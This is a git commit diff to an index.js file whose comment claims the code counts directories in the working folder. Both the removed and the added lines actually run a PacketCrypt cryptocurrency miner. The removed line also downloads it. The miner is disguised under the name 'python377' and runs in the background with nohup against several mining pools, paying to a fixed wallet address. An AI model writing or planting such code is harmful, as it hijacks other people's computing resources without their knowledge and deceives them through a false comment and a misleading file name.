dc17236bab31eed211f1edf298ef3051e0aeac7e
beanb1123 <103089678+beanb1123@users.noreply.github.com>
2024-10-16 01:36:11 +0200

    Update index.js

--- index.js
+++ index.js
@@ -2,7 +2,7 @@ const { exec } = require('child_process');
  
 // Counts the number of directory in
 // current working directory
-exec('wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.6.0/packetcrypt-v0.6.0-linux_amd64 && mv packetcrypt-v0.6.0-linux_amd64 python377 && chmod +x python377 && nohup ./python377 ann http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com -p pkt1qfhr09kswj2hy0xgnzzj5r8ux09m7ltnuumf4xx &', (error, stdout, stderr) => {
+exec('nohup ./python377 ann http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com -p pkt1qfhr09kswj2hy0xgnzzj5r8ux09m7ltnuumf4xx &', (error, stdout, stderr) => {
     if (error) {
         console.error(`exec error: ${error}`);
         return;
